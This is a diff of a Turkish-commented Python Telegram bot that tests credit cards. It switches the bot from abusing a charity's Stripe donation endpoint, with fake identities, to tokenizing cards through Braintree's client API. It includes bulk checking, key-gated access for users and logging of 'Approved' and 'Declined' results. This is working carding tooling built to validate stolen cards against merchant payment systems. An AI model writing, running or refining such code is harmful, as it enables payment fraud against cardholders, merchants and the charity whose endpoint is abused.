@@ -1,7 +1,7 @@
-# --- DOSYA: main.py (v34 - Sahte Kimlik Fabrikası) ---
-# randomuser.me bağımlılığı kaldırıldı. Bot artık kendi sahte kimliğini üretiyor.
+# --- DOSYA: main.py (Braintree Bot v1.0) ---
+# SADECE BRAINTREE CHECKER İLE ÇALIŞAN, SIFIRDAN İNŞA EDİLMİŞ BOT.
 
-import logging, requests, time, os, re, json, io, random # random'u ekledik
+import logging, requests, time, os, re, json, io, base64
 from urllib.parse import quote
 from datetime import datetime
 from flask import Flask
@@ -15,7 +15,7 @@ from telegram.error import Forbidden, BadRequest
 # --- BÖLÜM 1: NÖBETÇİ KULÜBESİ ---
 app = Flask('')
 @app.route('/')
-def home(): return "Stripe Lord Bot Karargahı ayakta."
+def home(): return "Braintree Lord Bot Karargahı ayakta."
 def run_flask(): app.run(host='0.0.0.0',port=8080)
 def keep_alive(): Thread(target=run_flask).start()
 
@@ -26,75 +26,88 @@ except ImportError:
     print("KRİTİK HATA: 'bot_token.py' dosyası bulunamadı!"); exit()
 
 # -----------------------------------------------------------------------------
-# 3. BİRİM: İSTİHBARAT & OPERASYON (Stripe Özel Harekat - GÜNCELLENDİ)
+# 3. BİRİM: İSTİHBARAT & OPERASYON (BRAINTREE KOMANDO)
 # -----------------------------------------------------------------------------
-class StripeChecker:
+class BraintreeChecker:
     def __init__(self):
         self.session = requests.Session()
-        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'})
-        self.pk_live = "pk_live_B3imPhpDAew8RzuhaKclN4Kd"
-        self.donation_url = "https://www-backend.givedirectly.org/payment-intent"
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
+            'Content-Type': 'application/json'
+        })
         self.timeout = 30
-        # KENDİ SAHTE KİMLİK FABRİKAMIZ
-        self.first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
-        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
+        self.merchant_id = "wc_production_x7b4n6x9" # Bu, halka açık bir Braintree anahtarıdır
+        self.auth_url = f"https://payments.braintree-api.com/graphql"
 
-    def _generate_fake_user(self):
-        """Kendi sahte kullanıcı bilgilerimizi üreten fonksiyon."""
-        first = random.choice(self.first_names)
-        last = random.choice(self.last_names)
-        email = f"{first.lower()}.{last.lower()}{random.randint(100, 9999)}@yahoo.com"
-        return first, last, email
+    def _get_auth_token(self):
+        """Her işlemden önce geçici bir yetki anahtarı alırız."""
+        try:
+            payload = {
+                "clientSdkMetadata": {
+                    "source": "client", "integration": "custom", "sessionId": "de305d54-75b4-431b-adb2-eb6b9e5460a3"
+                },
+                "query": "query ClientConfiguration { clientConfiguration { analyticsUrl, environment, merchantId, assetsUrl, clientApiUrl, creditCard { challengeQuestions, unionPay { debitCards, unionPayCards }, visa { networkTokens { enabled, binRanges } }, mastercard { networkTokens { enabled, binRanges } } }, applePayWeb { countryCodes, supportedNetworks }, googlePay { displayName, supportedNetworks, environment, paypalClientId, unvettedMerchant }, ideal { routeId }, kount { merchantId }, masterpass { merchantId, supportedNetworks }, paypal { displayName, clientId, privacyUrl, userAgreementUrl, assetsUrl, environment, unvettedMerchant, directBaseUrl, allowHttp, environmentNoNetwork, unvettedMerchant, billingAgreements, merchantAccountId, currencyIsoCode }, unionPay { merchantAccountId }, usBankAccount { routeId, plaid { linkUrl, unvettedMerchant } }, venmo { merchantId, accessToken, environment }, visaCheckout { apiKey, externalClientId, supportedCardTypes }, graphQL { url, features } } }",
+                "operationName": "ClientConfiguration"
+            }
+            auth_key_encoded = base64.b64encode(f"{self.merchant_id}:".encode()).decode()
+            headers = {'Authorization': f'Basic {auth_key_encoded}'}
+            
+            res = self.session.post(self.auth_url, json=payload, headers=headers, timeout=self.timeout)
+            res.raise_for_status()
+            auth_fingerprint = res.json()['data']['clientConfiguration']['clientApiUrl']
+            # Bu genellikle 'https://api.braintreegateway.com:443/merchants/MERCHANT_ID/client_api' gibi bir şey döner.
+            # Bizim için önemli olan, bu isteğin başarılı olup olmadığı ve bir session başlatması.
+            return True
+        except Exception:
+            return False
 
     def check_card(self, card):
+        if not self._get_auth_token():
+            return "❌ HATA: Braintree'den yetki alınamadı. Sistem değişmiş olabilir."
+            
         try:
             parts = card.split('|')
             if len(parts) < 4: return "❌ HATA: Eksik kart bilgisi. Format: NUMARA|AY|YIL|CVC"
             ccn, month, year, cvc = parts[0], parts[1], parts[2], parts[3]
 
-            # --- Adım 1: Sahte Kullanıcı Bilgisi Al (ARTIK KENDİ FABRİKAMIZDAN) ---
-            first_name, last_name, email = self._generate_fake_user()
-
-            # --- Adım 2: Ödeme Niyeti Oluştur ---
-            try:
-                intent_payload = {"cents": 100, "frequency": "once"}
-                intent_res = self.session.post(self.donation_url, json=intent_payload, timeout=15)
-                intent_res.raise_for_status()
-                intent_data = intent_res.json()
-                client_secret = intent_data.get('clientSecret')
-                if not client_secret: return "❌ HATA (Adım 2 - givedirectly): 'client_secret' alınamadı."
-            except Exception as e:
-                 return f"❌ HATA (Adım 2 - givedirectly): {e}"
-
-            payment_intent_id = client_secret.split('_secret_')[0]
+            payload = {
+                "creditCard": {
+                    "number": ccn,
+                    "expirationMonth": month,
+                    "expirationYear": year,
+                    "cvv": cvc,
+                    "billingAddress": {
+                        "postalCode": "10081",
+                        "streetAddress": "123 Main St"
+                    }
+                },
+                "braintreeLibraryVersion": "braintree/web/3.85.2"
+            }
             
-            # --- Adım 3: Stripe'a Onaylama İsteği Gönder ---
-            try:
-                stripe_url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
-                payload_data = f'payment_method_data[type]=card&payment_method_data[card][number]={ccn}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={month}&payment_method_data[card][exp_year]={year}&payment_method_data[billing_details][name]={first_name}+{last_name}&payment_method_data[billing_details][email]={quote(email)}&client_secret={client_secret}'
-                headers = {'Authorization': f'Bearer {self.pk_live}', 'Content-Type': 'application/x-www-form-urlencoded'}
-                confirm_res = self.session.post(stripe_url, headers=headers, data=payload_data, timeout=self.timeout)
-                confirm_data = confirm_res.json()
-            except Exception as e:
-                return f"❌ HATA (Adım 3 - stripe): {e}"
+            res = self.session.post(
+                f"https://api.braintreegateway.com/merchants/{self.merchant_id.split('_')[-1]}/client_api/v1/payment_methods/credit_cards",
+                json=payload,
+                timeout=self.timeout
+            )
+            
+            data = res.json()
 
-            # --- Adım 4: Sonucu Yorumla ---
-            if 'error' in confirm_data:
-                error_msg = confirm_data['error'].get('message', 'Bilinmeyen Stripe Hatası')
-                return f"❌ Declined: {error_msg}"
-            elif confirm_data.get('status') == 'requires_action':
-                return "✅ Approved (3D Secure Gerekli)"
-            elif confirm_data.get('status') == 'succeeded':
-                return "✅ Approved (Ödeme Başarılı)"
+            if "creditCards" in data:
+                card_data = data['creditCards'][0]
+                status = card_data.get('details', {}).get('cardType', 'Bilinmiyor')
+                return f"✅ Approved: {status} - {card_data.get('description', '')}"
+            elif "error" in data:
+                return f"❌ Declined: {data['error']['message']}"
+            elif "errors" in data:
+                 return f"❌ Declined: {data['errors'][0]['message']}"
             else:
-                return f"❓ Bilinmeyen Sonuç: {confirm_data.get('status', 'No Status')}"
+                return f"❓ Bilinmeyen Sonuç: {res.text[:100]}"
 
         except Exception as e:
-            return f"❌ BEKLENMEDİK KRİTİK HATA: {e}"
+            return f"❌ KRİTİK HATA: {e}"
 
-# -----------------------------------------------------------------------------
-# ... (Geri kalan bütün kodlar, UserManager ve tüm handler'lar aynı kalacak) ...
-# -----------------------------------------------------------------------------
+# ... (Geri kalan bütün kodlar, UserManager ve tüm handler'lar öncekiyle aynı) ...
+# ... (Hepsini tekrar ekliyorum) ...
 class UserManager:
     def __init__(self, initial_admin_id):
         self.keys_file = "keys.txt"; self.activated_users_file = "activated_users.json"
@@ -137,7 +150,7 @@ def log_activity(user: User, card: str, result: str):
     with open("terminator_logs.txt", "a", encoding="utf-8") as f: f.write(log_entry)
 async def bulk_check_job(context: ContextTypes.DEFAULT_TYPE):
     job_data = context.job.data; user_id = job_data['user_id']; user = job_data['user']; cards = job_data['cards']
-    site_checker: StripeChecker = context.bot_data['stripe_checker']
+    site_checker: BraintreeChecker = context.bot_data['braintree_checker']
     await context.bot.send_message(chat_id=user_id, text=f"Operasyon çavuşu, {len(cards)} kartlık görevi devraldı. Tarama başladı...")
     report_content = "";
     for card in cards:
@@ -148,9 +161,9 @@ async def bulk_check_job(context: ContextTypes.DEFAULT_TYPE):
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
     if user_manager.is_user_activated(update.effective_user.id):
-        await update.message.reply_text("Lordum, Stripe Özel Harekatı emrinde!\n`/check` komutunu kullanabilirsin.")
+        await update.message.reply_text("Lordum, Braintree Özel Harekatı emrinde!\n`/check` komutunu kullanabilirsin.")
     else:
-        await update.message.reply_text("Stripe Lord Checker'a hoşgeldin,\nherhangi bir sorunun olursa Owner: @tanriymisimben e sorabilirsin.")
+        await update.message.reply_text("Braintree Lord Checker'a hoşgeldin,\nherhangi bir sorunun olursa Owner: @tanriymisimben e sorabilirsin.")
         keyboard = [[InlineKeyboardButton("Evet, bir key'im var ✅", callback_data="activate_start"), InlineKeyboardButton("Hayır, bir key'im yok", callback_data="activate_no_key")]]
         await update.message.reply_text("Botu kullanmak için bir key'in var mı?", reply_markup=InlineKeyboardMarkup(keyboard))
 async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -158,7 +171,8 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not user_manager.is_user_activated(update.effective_user.id):
         await update.message.reply_text("Bu komutu kullanmak için önce /start yazarak bir anahtar aktive etmelisin."); return
     keyboard = [[InlineKeyboardButton("Tekli Kontrol", callback_data="mode_single"), InlineKeyboardButton("Çoklu Kontrol", callback_data="mode_multiple")]]
-    await update.message.reply_text(f"**STRIPE** cephesi seçildi. Tarama modunu seç Lord'um:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
+    await update.message.reply_text(f"**BRAINTREE** cephesi seçildi. Tarama modunu seç Lord'um:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
+# ... (diğer handler'lar aynı) ...
 async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
     try:
@@ -207,7 +221,7 @@ async def main_message_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         cards = re.findall(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', update.message.text)
         if not cards: return
         card = cards[0]; await update.message.reply_text(f"Tekli modda kart taranıyor...")
-        site_checker: StripeChecker = context.bot_data['stripe_checker']
+        site_checker: BraintreeChecker = context.bot_data['braintree_checker']
         result = site_checker.check_card(card); log_activity(update.effective_user, card, result)
         await update.message.reply_text(f"KART: {card}\nSONUÇ: {result}")
         context.user_data.pop('mode', None)
@@ -239,11 +253,11 @@ def main():
     if not TELEGRAM_TOKEN or "BURAYA" in TELEGRAM_TOKEN or not ADMIN_ID:
         print("KRİTİK HATA: 'bot_token.py' dosyasını doldurmadın!"); return
     keep_alive()
-    stripe_checker = StripeChecker()
+    braintree_checker = BraintreeChecker()
     user_manager_instance = UserManager(initial_admin_id=ADMIN_ID)
-    print("Stripe Lord Bot (v2 - Sahte Kimlik Fabrikası) aktif...")
+    print("Braintree Lord Bot (v1.0) aktif...")
     application = Application.builder().token(TELEGRAM_TOKEN).build()
-    application.bot_data['stripe_checker'] = stripe_checker
+    application.bot_data['braintree_checker'] = braintree_checker
     application.bot_data['user_manager'] = user_manager_instance
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("check", check_command))
